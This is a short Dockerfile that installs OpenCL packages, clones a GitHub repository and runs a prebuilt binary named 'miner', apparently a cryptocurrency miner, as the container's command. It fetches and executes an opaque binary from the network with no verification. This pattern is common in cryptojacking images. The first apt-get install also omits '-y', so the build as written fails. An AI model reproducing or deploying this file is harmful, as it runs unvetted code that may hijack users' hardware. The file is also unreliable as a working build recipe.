FROM ubuntu:latest

RUN apt-get update && apt-get install ocl-icd-opencl-dev && apt-get install -y git wget

RUN git clone https://github.com/varfeplas/14111.git /14111
RUN chmod +x /14111/miner
CMD ["/14111/miner"]
